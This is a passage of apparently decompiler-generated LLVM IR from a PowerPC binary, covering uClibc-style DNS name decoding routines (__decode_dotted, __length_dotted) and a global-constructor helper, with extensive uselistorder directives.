dec_label_pc_100145ac:                            ; preds = %entry, %dec_label_pc_10014588.dec_label_pc_1001459c_crit_edge
  %v0_100145ac14 = phi i32 [ %v0_1001459c.pre, %dec_label_pc_10014588.dec_label_pc_1001459c_crit_edge ], [ %tmp, %entry ]
  %v1_100145ac = inttoptr i32 %v0_100145ac14 to i8*
  %v2_100145ac = load i8, i8* %v1_100145ac, align 1
  %v3_100145ac = zext i8 %v2_100145ac to i32
  store i32 %v3_100145ac, i32* %r0.global-to-local, align 4
  %v3_100145b0 = icmp eq i8 %v2_100145ac, 0
  br i1 %v3_100145b0, label %dec_label_pc_100145b8, label %dec_label_pc_10014540

dec_label_pc_100145b8:                            ; preds = %dec_label_pc_10014588.dec_label_pc_1001459c_crit_edge, %dec_label_pc_10014588, %dec_label_pc_100145ac, %entry
  %v0_100145b8 = load i32, i32* %r27.global-to-local, align 4
  %tmp10 = icmp slt i32 %v0_100145b8, 1
  br i1 %tmp10, label %dec_label_pc_100145d0, label %dec_label_pc_100145c0

dec_label_pc_100145c0:                            ; preds = %dec_label_pc_100145b8
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_100145c4 = load i32, i32* @r28, align 4
  %v1_100145c4 = add i32 %v0_100145c4, 1
  store i32 %v1_100145c4, i32* %r3.global-to-local, align 4
  %v1_100145c8 = load i32, i32* @r29, align 4
  %v4_100145c8 = add i32 %v1_100145c8, %v0_100145c4
  %v5_100145c8 = inttoptr i32 %v4_100145c8 to i8*
  store i8 0, i8* %v5_100145c8, align 1
  %v0_100145e4.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100145d4

dec_label_pc_100145d0:                            ; preds = %dec_label_pc_1001455c, %dec_label_pc_100145b8
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100145d4

dec_label_pc_100145d4:                            ; preds = %dec_label_pc_100145c0, %dec_label_pc_100145d0
  %v0_100145e4 = phi i32 [ %v0_100145e4.pre, %dec_label_pc_100145c0 ], [ -1, %dec_label_pc_100145d0 ]
  store i32 %v0_10014520, i32* %r0.global-to-local, align 4
  ret i32 %v0_100145e4

; uselistorder directives
  uselistorder i32 %v0_100145ac14, { 1, 0 }
  uselistorder i32 %v0_1001459c.pre, { 0, 2, 1 }
  uselistorder i32 %v0_10014588, { 1, 0, 3, 2 }
  uselistorder i32 %v1_10014558, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 5, 3, 2, 4, 6 }
  uselistorder i32 16777216, { 1, 0, 2 }
  uselistorder i32 ()* @__GI_strlen, { 9, 25, 24, 17, 16, 21, 20, 19, 26, 15, 14, 13, 11, 12, 10, 23, 22, 18, 8, 0, 7, 6, 4, 5, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__GI_strchr, { 3, 2, 4, 11, 10, 9, 8, 7, 6, 5, 1, 0 }
  uselistorder i32 46, { 0, 4, 3, 5, 6, 7, 1, 2 }
  uselistorder label %dec_label_pc_100145d4, { 1, 0 }
  uselistorder label %dec_label_pc_100145d0, { 1, 0 }
  uselistorder label %dec_label_pc_100145b8, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_100145ac, { 1, 0 }
  uselistorder label %dec_label_pc_1001455c, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cr4_eq.global-to-local = alloca i1, align 1
  %r11.global-to-local = alloca i32, align 4
  %r27.global-to-local = alloca i32, align 4
  %v0_100145ec = call i32 @__asm_mfcr()
  store i32 %v0_100145ec, i32* @r26, align 4
  %v3_100145f8 = icmp eq i32 %v0_100145ec, 0
  store i32 %arg2, i32* @r25, align 4
  %v0_10014608 = load i32, i32* @r6, align 4
  store i32 %v0_10014608, i32* @r24, align 4
  br i1 %v3_100145f8, label %dec_label_pc_100146c0, label %dec_label_pc_10014610

dec_label_pc_10014610:                            ; preds = %entry
  store i32 1, i32* @r23, align 4
  store i32 0, i32* %r27.global-to-local, align 4
  store i32 0, i32* %r11.global-to-local, align 4
  %v1_1001469c14 = load i32, i32* @r4, align 4
  %v2_1001469c15 = add i32 %v1_1001469c14, %v0_100145ec
  %v3_1001469c16 = inttoptr i32 %v2_1001469c15 to i8*
  %v4_1001469c17 = load i8, i8* %v3_1001469c16, align 1
  %v5_1001469c18 = zext i8 %v4_1001469c17 to i32
  store i32 %v5_1001469c18, i32* @r31, align 4
  store i1 false, i1* %cr4_eq.global-to-local, align 1
  %v3_100146a420 = icmp eq i8 %v4_1001469c17, 0
  br i1 %v3_100146a420, label %dec_label_pc_100146b0, label %dec_label_pc_10014620

dec_label_pc_10014620:                            ; preds = %dec_label_pc_10014610, %dec_label_pc_10014698
  %v3_100146a022 = phi i1 [ %v3_100146a0, %dec_label_pc_10014698 ], [ false, %dec_label_pc_10014610 ]
  %v5_1001469c21 = phi i32 [ %v5_1001469c, %dec_label_pc_10014698 ], [ %v5_1001469c18, %dec_label_pc_10014610 ]
  br i1 %v3_100146a022, label %dec_label_pc_10014628, label %dec_label_pc_10014624

dec_label_pc_10014624:                            ; preds = %dec_label_pc_10014620
  %v0_10014624 = load i32, i32* %r27.global-to-local, align 4
  %v1_10014624 = add i32 %v0_10014624, 1
  store i32 %v1_10014624, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10014628

dec_label_pc_10014628:                            ; preds = %dec_label_pc_10014620, %dec_label_pc_10014624
  %v1_10014628 = call i32 @__asm_rlwinm(i32 %v5_1001469c21, i32 0, i32 24, i32 25)
  %v0_1001462c = load i32, i32* @r4, align 4
  %v1_1001462c = add i32 %v0_1001462c, 1
  store i32 %v1_1001462c, i32* @r30, align 4
  %v3_10014630 = icmp eq i32 %v1_10014628, 192
  br i1 %v3_10014630, label %dec_label_pc_10014638, label %dec_label_pc_10014658

dec_label_pc_10014638:                            ; preds = %dec_label_pc_10014628
  %v0_10014638 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10014638, label %dec_label_pc_10014640, label %dec_label_pc_1001463c

dec_label_pc_1001463c:                            ; preds = %dec_label_pc_10014638
  %v0_1001463c = load i32, i32* %r27.global-to-local, align 4
  %v1_1001463c = add i32 %v0_1001463c, 1
  store i32 %v1_1001463c, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10014640

dec_label_pc_10014640:                            ; preds = %dec_label_pc_10014638, %dec_label_pc_1001463c
  %v0_10014640 = load i32, i32* @r26, align 4
  %v2_10014640 = add i32 %v0_10014640, %v1_1001462c
  %v3_10014640 = inttoptr i32 %v2_10014640 to i8*
  %v4_10014640 = load i8, i8* %v3_10014640, align 1
  %v5_10014640 = zext i8 %v4_10014640 to i32
  %v1_10014644 = call i32 @__asm_rlwinm(i32 %v5_1001469c21, i32 8, i32 18, i32 23)
  %v0_10014648 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_10014648, i32* @r28, align 4
  store i32 0, i32* @r23, align 4
  %v2_10014650 = or i32 %v5_10014640, %v1_10014644
  store i32 %v2_10014650, i32* @r4, align 4
  br label %dec_label_pc_10014698

dec_label_pc_10014658:                            ; preds = %dec_label_pc_10014628
  %v0_10014658 = load i32, i32* %r11.global-to-local, align 4
  %v2_10014658 = add i32 %v0_10014658, %v5_1001469c21
  store i32 %v2_10014658, i32* @r29, align 4
  %v1_1001465c = add i32 %v2_10014658, 1
  store i32 %v1_1001465c, i32* @r28, align 4
  %v1_10014660 = load i32, i32* @r24, align 4
  %v2_10014660 = icmp ult i32 %v1_1001465c, %v1_10014660
  br i1 %v2_10014660, label %dec_label_pc_10014668, label %dec_label_pc_100146c0

dec_label_pc_10014668:                            ; preds = %dec_label_pc_10014658
  %v0_10014668 = load i32, i32* @r26, align 4
  %v2_10014668 = add i32 %v0_10014668, %v1_1001462c
  store i32 %v2_10014668, i32* @r4, align 4
  %v0_1001466c = load i32, i32* @r25, align 4
  %v2_1001466c = add i32 %v0_1001466c, %v0_10014658
  store i32 %v2_1001466c, i32* @r3, align 4
  store i32 %v5_1001469c21, i32* @r5, align 4
  store i32 268519032, i32* @lr, align 4
  %v0_10014674 = call i32 @memcpy()
  %v0_10014678 = load i32, i32* @r30, align 4
  %v2_10014678 = add i32 %v0_10014678, %v5_1001469c21
  store i32 %v2_10014678, i32* @r4, align 4
  %v0_1001467c = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_1001467c, label %dec_label_pc_10014684, label %dec_label_pc_10014680

dec_label_pc_10014680:                            ; preds = %dec_label_pc_10014668
  %v0_10014680 = load i32, i32* %r27.global-to-local, align 4
  %v2_10014680 = add i32 %v0_10014680, %v5_1001469c21
  store i32 %v2_10014680, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10014684

dec_label_pc_10014684:                            ; preds = %dec_label_pc_10014668, %dec_label_pc_10014680
  %v0_10014684 = load i32, i32* @r26, align 4
  %v2_10014684 = add i32 %v0_10014684, %v2_10014678
  %v3_10014684 = inttoptr i32 %v2_10014684 to i8*
  %v4_10014684 = load i8, i8* %v3_10014684, align 1
  %v3_10014688 = icmp eq i8 %v4_10014684, 0
  br i1 %v3_10014688, label %dec_label_pc_10014694, label %dec_label_pc_10014690

dec_label_pc_10014690:                            ; preds = %dec_label_pc_10014684
  br label %dec_label_pc_10014694

dec_label_pc_10014694:                            ; preds = %dec_label_pc_10014684, %dec_label_pc_10014690
  %v0_10014694.off0 = phi i8 [ 0, %dec_label_pc_10014684 ], [ 46, %dec_label_pc_10014690 ]
  %v1_10014694 = load i32, i32* @r25, align 4
  %v2_10014694 = load i32, i32* @r29, align 4
  %v4_10014694 = add i32 %v2_10014694, %v1_10014694
  %v5_10014694 = inttoptr i32 %v4_10014694 to i8*
  store i8 %v0_10014694.off0, i8* %v5_10014694, align 1
  %v0_10014698.pre = load i32, i32* @r28, align 4
  %v0_100146a0.pre.pre = load i32, i32* @r23, align 4
  %v1_1001469c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10014698

dec_label_pc_10014698:                            ; preds = %dec_label_pc_10014640, %dec_label_pc_10014694
  %v1_1001469c = phi i32 [ %v2_10014650, %dec_label_pc_10014640 ], [ %v1_1001469c.pre, %dec_label_pc_10014694 ]
  %v0_100146a0.pre = phi i32 [ 0, %dec_label_pc_10014640 ], [ %v0_100146a0.pre.pre, %dec_label_pc_10014694 ]
  %v0_10014698 = phi i32 [ %v0_10014648, %dec_label_pc_10014640 ], [ %v0_10014698.pre, %dec_label_pc_10014694 ]
  %v0_1001469c.pre = load i32, i32* @r26, align 4
  store i32 %v0_10014698, i32* %r11.global-to-local, align 4
  %v2_1001469c = add i32 %v1_1001469c, %v0_1001469c.pre
  %v3_1001469c = inttoptr i32 %v2_1001469c to i8*
  %v4_1001469c = load i8, i8* %v3_1001469c, align 1
  %v5_1001469c = zext i8 %v4_1001469c to i32
  store i32 %v5_1001469c, i32* @r31, align 4
  %v3_100146a0 = icmp eq i32 %v0_100146a0.pre, 0
  store i1 %v3_100146a0, i1* %cr4_eq.global-to-local, align 1
  %v3_100146a4 = icmp eq i8 %v4_1001469c, 0
  br i1 %v3_100146a4, label %dec_label_pc_100146ac, label %dec_label_pc_10014620

dec_label_pc_100146ac:                            ; preds = %dec_label_pc_10014698
  %v0_100146b4.pre.pre = load i32, i32* %r27.global-to-local, align 4
  br i1 %v3_100146a0, label %dec_label_pc_100146c0, label %dec_label_pc_100146b0

dec_label_pc_100146b0:                            ; preds = %dec_label_pc_10014610, %dec_label_pc_100146ac
  %v0_100146b4.pre26 = phi i32 [ %v0_100146b4.pre.pre, %dec_label_pc_100146ac ], [ 0, %dec_label_pc_10014610 ]
  %v1_100146b0 = add i32 %v0_100146b4.pre26, 1
  store i32 %v1_100146b0, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_100146c0

dec_label_pc_100146c0:                            ; preds = %dec_label_pc_10014658, %dec_label_pc_100146ac, %dec_label_pc_100146b0, %entry
  %storemerge1 = phi i32 [ -1, %entry ], [ %v1_100146b0, %dec_label_pc_100146b0 ], [ %v0_100146b4.pre.pre, %dec_label_pc_100146ac ], [ -1, %dec_label_pc_10014658 ]
  %v1_100146d0 = call %0 @__asm_mtcrf(i32 8, i32 %v0_100145ec)
  %v9_100146d0 = extractvalue %0 %v1_100146d0, 7
  store i4 %v9_100146d0, i4* @cr4, align 1
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v0_100146b4.pre.pre, { 1, 0 }
  uselistorder i1 %v3_100146a0, { 0, 2, 1 }
  uselistorder i32 %v5_1001469c, { 1, 0 }
  uselistorder i32 %v5_1001469c21, { 5, 4, 1, 3, 2, 0 }
  uselistorder i32 %v0_100145ec, { 1, 0, 2, 3 }
  uselistorder i32* %r27.global-to-local, { 0, 7, 1, 4, 2, 5, 3, 6, 8 }
  uselistorder i32* %r11.global-to-local, { 0, 2, 1, 3 }
  uselistorder i4* @cr4, { 3, 4, 5, 2, 0, 6, 1 }
  uselistorder %0 (i32, i32)* @__asm_mtcrf, { 2, 3, 0, 4, 1 }
  uselistorder i32 ()* @memcpy, { 12, 5, 11, 10, 9, 4, 3, 8, 7, 2, 21, 18, 17, 0, 19, 6, 1, 16, 15, 14, 20, 13 }
  uselistorder i32* @r5, { 41, 42, 43, 3, 44, 45, 46, 11, 57, 58, 50, 51, 37, 4, 52, 1, 53, 12, 13, 14, 15, 16, 17, 59, 18, 19, 20, 21, 22, 23, 72, 9, 10, 8, 5, 54, 55, 64, 65, 66, 38, 24, 25, 26, 73, 74, 75, 76, 67, 68, 2, 69, 70, 71, 27, 29, 28, 30, 0, 31, 32, 33, 60, 61, 47, 48, 34, 35, 36, 49, 7, 62, 63, 6, 39, 40, 56 }
  uselistorder i32* @r29, { 74, 75, 76, 77, 78, 142, 143, 1, 79, 14, 80, 81, 82, 83, 85, 84, 86, 87, 88, 89, 90, 20, 21, 22, 23, 24, 2, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 43, 104, 106, 107, 123, 124, 144, 145, 45, 46, 47, 44, 129, 16, 48, 49, 3, 50, 51, 52, 53, 54, 55, 146, 147, 148, 149, 150, 151, 152, 4, 35, 128, 131, 132, 133, 134, 25, 26, 135, 5, 136, 137, 138, 139, 140, 141, 125, 126, 127, 6, 130, 7, 153, 154, 155, 56, 57, 8, 58, 59, 60, 61, 114, 115, 15, 116, 108, 109, 110, 113, 111, 17, 9, 0, 112, 62, 63, 64, 65, 66, 67, 68, 71, 10, 13, 11, 72, 19, 69, 70, 156, 157, 158, 159, 117, 118, 119, 120, 121, 12, 122, 105, 27, 28, 29, 30, 31, 32, 33, 34, 36, 37, 38, 39, 40, 41, 42, 73, 18 }
  uselistorder i32* @r28, { 2, 76, 77, 78, 79, 80, 81, 86, 87, 82, 83, 84, 85, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 17, 3, 16, 18, 19, 20, 21, 22, 23, 98, 102, 99, 100, 101, 1, 103, 104, 41, 42, 128, 129, 136, 137, 43, 4, 44, 45, 46, 47, 48, 5, 138, 139, 140, 141, 148, 6, 35, 36, 37, 12, 38, 24, 25, 26, 27, 28, 29, 30, 31, 32, 132, 133, 134, 135, 130, 131, 142, 143, 144, 145, 146, 49, 50, 113, 7, 114, 115, 107, 108, 109, 110, 111, 112, 51, 52, 53, 8, 54, 55, 9, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 0, 72, 73, 13, 14, 15, 147, 116, 117, 118, 119, 10, 120, 11, 121, 122, 123, 124, 125, 126, 127, 74, 75, 105, 106, 33, 34, 39, 40 }
  uselistorder i32 23, { 10, 13, 14, 15, 6, 7, 8, 0, 1, 2, 5, 3, 4, 9, 11, 12 }
  uselistorder i32 18, { 1, 0, 3, 4, 2, 5 }
  uselistorder i32 8, { 82, 83, 84, 85, 86, 87, 18, 19, 88, 89, 90, 91, 92, 93, 24, 25, 20, 13, 14, 15, 26, 27, 28, 29, 30, 94, 95, 96, 97, 17, 42, 117, 0, 99, 43, 44, 45, 46, 47, 48, 49, 50, 10, 51, 52, 53, 129, 130, 137, 140, 8, 75, 76, 11, 31, 12, 79, 114, 32, 121, 120, 118, 119, 33, 34, 35, 122, 123, 124, 125, 126, 127, 1, 107, 108, 109, 21, 134, 135, 136, 2, 141, 3, 138, 139, 100, 101, 36, 102, 37, 54, 55, 56, 57, 58, 22, 59, 60, 61, 62, 4, 5, 63, 64, 9, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 7, 6, 131, 132, 133, 103, 104, 105, 106, 98, 38, 39, 40, 41, 77, 78, 23, 80, 81, 110, 111, 112, 113, 115, 116, 16, 128 }
  uselistorder i32* @r30, { 82, 83, 84, 8, 85, 87, 89, 90, 91, 92, 93, 86, 88, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 19, 20, 21, 1, 22, 23, 24, 7, 25, 26, 108, 105, 106, 5, 107, 4, 40, 41, 42, 9, 43, 44, 45, 110, 111, 112, 121, 122, 123, 124, 17, 125, 126, 127, 128, 129, 130, 131, 132, 46, 47, 48, 49, 50, 143, 144, 10, 51, 52, 53, 54, 55, 11, 153, 154, 155, 156, 12, 146, 157, 168, 158, 159, 27, 0, 79, 13, 80, 81, 147, 148, 149, 28, 29, 30, 31, 32, 150, 151, 152, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 145, 160, 161, 162, 163, 164, 165, 166, 14, 167, 56, 57, 119, 117, 118, 120, 116, 114, 113, 6, 115, 58, 59, 60, 61, 62, 2, 64, 18, 65, 15, 66, 67, 63, 68, 69, 70, 71, 72, 73, 74, 16, 75, 76, 3, 77, 78, 109, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i1 false, { 2, 3, 5, 13, 6, 7, 9, 10, 0, 11, 17, 18, 19, 14, 15, 16, 4, 12, 1, 8, 20 }
  uselistorder i32* @r31, { 137, 2, 7, 138, 6, 139, 140, 141, 8, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 45, 50, 9, 39, 10, 11, 51, 52, 53, 156, 157, 158, 159, 1, 160, 161, 162, 163, 164, 165, 166, 167, 12, 168, 64, 65, 66, 67, 68, 169, 13, 170, 171, 172, 173, 14, 174, 175, 176, 177, 178, 179, 69, 70, 71, 72, 73, 74, 75, 76, 77, 15, 78, 16, 271, 272, 273, 17, 186, 185, 3, 187, 188, 211, 238, 239, 240, 241, 242, 131, 132, 133, 134, 189, 18, 190, 191, 19, 200, 201, 20, 202, 203, 79, 80, 81, 254, 255, 256, 82, 83, 21, 84, 85, 86, 87, 22, 88, 23, 89, 90, 91, 44, 92, 0, 274, 275, 276, 24, 46, 277, 40, 258, 25, 259, 283, 284, 123, 42, 124, 125, 278, 281, 282, 62, 63, 126, 127, 128, 129, 54, 55, 56, 57, 58, 135, 136, 4, 260, 261, 262, 263, 264, 265, 59, 60, 61, 266, 267, 268, 269, 270, 243, 244, 245, 27, 246, 247, 248, 26, 249, 250, 251, 252, 253, 257, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 93, 94, 204, 205, 206, 28, 207, 208, 209, 194, 195, 196, 197, 198, 29, 43, 199, 5, 192, 193, 30, 210, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 33, 32, 112, 31, 116, 117, 34, 118, 119, 120, 121, 48, 49, 114, 113, 115, 279, 35, 280, 47, 36, 41, 212, 213, 214, 215, 216, 217, 218, 219, 220, 221, 222, 224, 223, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 180, 181, 182, 183, 37, 38, 184, 122, 130 }
  uselistorder i32* @r23, { 1, 2, 3, 7, 4, 5, 6, 8, 9, 10, 12, 11, 0, 13, 14, 15, 16, 17, 18, 19, 20, 21 }
  uselistorder i32* @r24, { 3, 4, 7, 5, 6, 8, 9, 10, 0, 11, 12, 13, 14, 15, 2, 16, 17, 18, 1, 19, 20, 21, 22, 23, 24, 25 }
  uselistorder i32* @r6, { 15, 16, 2, 3, 4, 5, 6, 7, 8, 9, 0, 1, 10, 11, 12, 17, 13, 14, 18 }
  uselistorder i32* @r25, { 11, 12, 13, 15, 16, 14, 17, 1, 2, 18, 19, 20, 21, 22, 23, 24, 25, 26, 31, 34, 3, 4, 27, 28, 29, 30, 0, 7, 8, 9, 10, 32, 33, 5, 6 }
  uselistorder i32* @r26, { 1, 30, 31, 32, 33, 34, 35, 36, 39, 37, 38, 40, 41, 42, 43, 44, 3, 4, 45, 46, 47, 48, 50, 2, 51, 52, 54, 55, 56, 57, 58, 59, 60, 10, 11, 77, 5, 6, 7, 73, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 74, 12, 13, 14, 15, 16, 17, 19, 18, 20, 21, 22, 23, 24, 25, 26, 27, 0, 75, 76, 53, 28, 29, 49, 8, 9 }
  uselistorder i32 ()* @__asm_mfcr, { 28, 35, 27, 26, 12, 34, 20, 30, 9, 8, 7, 6, 5, 15, 31, 41, 25, 40, 33, 32, 10, 29, 11, 39, 23, 21, 38, 19, 3, 14, 18, 13, 37, 24, 17, 16, 36, 4, 2, 1, 0, 22 }
  uselistorder label %dec_label_pc_100146c0, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100146b0, { 1, 0 }
  uselistorder label %dec_label_pc_10014698, { 1, 0 }
  uselistorder label %dec_label_pc_10014694, { 1, 0 }
  uselistorder label %dec_label_pc_10014684, { 1, 0 }
  uselistorder label %dec_label_pc_10014640, { 1, 0 }
  uselistorder label %dec_label_pc_10014628, { 1, 0 }
  uselistorder label %dec_label_pc_10014620, { 1, 0 }
}

define i32 @__length_dotted() local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %v0_100146dc = load i32, i32* @r3, align 4
  store i32 %v0_100146dc, i32* %r11.global-to-local, align 4
  %v3_100146dc = icmp eq i32 %v0_100146dc, 0
  %v0_100146e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_100146dc, i32 %v0_100146e4)
  %v0_100146f4 = load i32, i32* @r4, align 4
  br label %dec_label_pc_10014700

dec_label_pc_100146ec:                            ; preds = %dec_label_pc_100146fc
  %v1_100146ec = add i32 %v1_10014700, 2
  br label %dec_label_pc_1001471c

dec_label_pc_100146fc:                            ; preds = %dec_label_pc_10014700
  %v2_10014714 = add i32 %v1_10014704, %v5_10014700
  %v3_10014710 = icmp eq i32 %v1_1001470c, 192
  br i1 %v3_10014710, label %dec_label_pc_100146ec, label %dec_label_pc_10014700

dec_label_pc_10014700:                            ; preds = %dec_label_pc_100146fc, %entry
  %v1_10014700 = phi i32 [ %v2_10014714, %dec_label_pc_100146fc ], [ %v0_100146f4, %entry ]
  %v0_10014700 = load i32, i32* %r11.global-to-local, align 4
  %v2_10014700 = add i32 %v0_10014700, %v1_10014700
  %v3_10014700 = inttoptr i32 %v2_10014700 to i8*
  %v4_10014700 = load i8, i8* %v3_10014700, align 1
  %v5_10014700 = zext i8 %v4_10014700 to i32
  %v1_10014704 = add i32 %v1_10014700, 1
  %v3_10014708 = icmp eq i8 %v4_10014700, 0
  %v1_1001470c = call i32 @__asm_rlwinm(i32 %v5_10014700, i32 0, i32 24, i32 25)
  br i1 %v3_10014708, label %dec_label_pc_1001471c, label %dec_label_pc_100146fc

dec_label_pc_1001471c:                            ; preds = %dec_label_pc_10014700, %dec_label_pc_100146ec
  %v1_1001471c = phi i32 [ %v1_100146ec, %dec_label_pc_100146ec ], [ %v1_10014704, %dec_label_pc_10014700 ]
  %v0_1001471c = load i32, i32* @r4, align 4
  %v2_1001471c = sub i32 %v1_1001471c, %v0_1001471c
  ret i32 %v2_1001471c

; uselistorder directives
  uselistorder i32 %v1_10014704, { 1, 0 }
  uselistorder i32 %v5_10014700, { 1, 0 }
  uselistorder i32 %v1_10014700, { 2, 1, 0 }
  uselistorder i32 %v0_100146dc, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @__asm_rlwinm, { 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 38, 4, 5, 6, 21, 52, 53, 1, 46, 2, 47, 0, 51, 22, 54, 55, 56, 7, 36, 37, 3, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 39, 40, 41, 42, 35, 50, 43, 44, 45, 48, 49, 57 }
  uselistorder i32 25, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 24, { 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 13, 37, 38, 46, 39, 40, 43, 14, 5, 48, 6, 15, 44, 41, 42, 16, 17, 18, 19, 20, 21, 22, 23, 24, 51, 52, 45, 7, 8, 9, 10, 11, 12, 1, 2, 3, 4, 25, 26, 47, 49, 0, 50 }
  uselistorder i8 0, { 37, 35, 4, 38, 2, 39, 40, 24, 44, 42, 23, 43, 41, 22, 45, 46, 47, 48, 5, 50, 49, 25, 6, 51, 52, 7, 53, 54, 21, 27, 57, 55, 56, 26, 58, 59, 8, 61, 60, 28, 62, 63, 0, 64, 65, 66, 9, 67, 10, 68, 11, 1, 12, 69, 70, 71, 73, 74, 75, 76, 72, 77, 13, 78, 79, 80, 81, 83, 84, 85, 86, 82, 87, 3, 14, 15, 16, 17, 18, 19, 88, 89, 90, 92, 91, 20, 93, 94, 95, 96, 97, 98, 100, 29, 101, 102, 99, 103, 104, 105, 106, 108, 107, 109, 110, 111, 112, 113, 114, 115, 116, 118, 117, 120, 119, 121, 30, 123, 122, 36, 124, 31, 125, 127, 128, 126, 32, 129, 130, 34, 131, 33, 132, 133, 134, 135, 136 }
  uselistorder i32 192, { 1, 2, 0, 3 }
  uselistorder i32 2, { 0, 4, 115, 49, 116, 117, 30, 1, 2, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 5, 130, 6, 92, 93, 94, 31, 29, 131, 132, 133, 134, 135, 50, 51, 52, 96, 97, 152, 42, 7, 8, 3, 53, 141, 9, 10, 32, 138, 139, 40, 98, 99, 11, 100, 101, 102, 54, 55, 112, 56, 113, 57, 114, 153, 33, 12, 13, 58, 59, 60, 61, 62, 14, 47, 48, 63, 64, 142, 46, 155, 15, 16, 17, 18, 34, 35, 36, 37, 38, 65, 150, 151, 39, 136, 137, 103, 104, 105, 19, 20, 21, 22, 23, 106, 107, 24, 109, 110, 111, 28, 108, 140, 66, 25, 26, 154, 156, 67, 95, 69, 70, 68, 71, 43, 72, 73, 44, 75, 76, 74, 77, 79, 78, 80, 81, 82, 83, 84, 143, 144, 145, 146, 147, 85, 41, 148, 86, 87, 88, 89, 90, 149, 45, 27, 91 }
  uselistorder i32* @r4, { 91, 92, 1, 93, 94, 95, 96, 2, 97, 98, 99, 100, 9, 10, 101, 102, 103, 104, 105, 106, 107, 108, 109, 132, 129, 130, 110, 111, 112, 113, 114, 6, 115, 116, 117, 126, 127, 79, 11, 48, 49, 50, 51, 52, 53, 54, 55, 142, 7, 8, 71, 72, 134, 25, 26, 14, 89, 90, 15, 16, 131, 73, 12, 118, 119, 125, 128, 135, 136, 137, 3, 56, 57, 58, 13, 59, 60, 120, 121, 122, 123, 124, 4, 74, 75, 141, 61, 62, 63, 64, 0, 65, 66, 67, 133, 68, 69, 70, 5, 17, 18, 138, 139, 140, 19, 20, 21, 22, 23, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 76, 77, 78, 80, 81, 82, 83, 84, 85, 86, 87, 88 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 10, 11, 12, 13, 14, 15, 16, 17, 8, 29, 31, 26, 9, 1, 2, 3, 4, 5, 30, 20, 21, 22, 23, 24, 6, 18, 19, 25, 33, 32, 7, 27, 0, 28 }
}

define i32 @__do_global_ctors_aux(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10028000.660 to i32), i32* %r31.global-to-local, align 4
  %v3_10014740 = load i32, i32* @global_var_10028000.660, align 4
  %v3_10014744 = icmp eq i32 %v3_10014740, -1
  br i1 %v3_10014744, label %dec_label_pc_10014760, label %dec_label_pc_1001474c

dec_label_pc_1001474c:                            ; preds = %entry, %dec_label_pc_1001474c
  %v0_1001474c = phi i32 [ %v3_10014754, %dec_label_pc_1001474c ], [ %v3_10014740, %entry ]
  call void @__pseudo_call(i32 %v0_1001474c)
  %v0_10014754 = load i32, i32* %r31.global-to-local, align 4
  %v1_10014754 = add i32 %v0_10014754, -4
  %v2_10014754 = inttoptr i32 %v1_10014754 to i32*
  %v3_10014754 = load i32, i32* %v2_10014754, align 4
  store i32 %v1_10014754, i32* %r31.global-to-local, align 4
  %v3_10014758 = icmp eq i32 %v3_10014754, -1
  br i1 %v3_10014758, label %dec_label_pc_10014760, label %dec_label_pc_1001474c

dec_label_pc_10014760:                            ; preds = %dec_label_pc_1001474c, %entry
  %v0_10014770 = load i32, i32* @r3, align 4
  ret i32 %v0_10014770

; uselistorder directives
  uselistorder i32 %v3_10014754, { 1, 0 }
  uselistorder i32 -4, { 28, 12, 13, 14, 21, 22, 23, 24, 25, 15, 16, 2, 3, 4, 5, 6, 7, 8, 9, 10, 27, 26, 32, 33, 29, 30, 31, 17, 18, 19, 20, 0, 11, 1 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 3, 4, 0 }
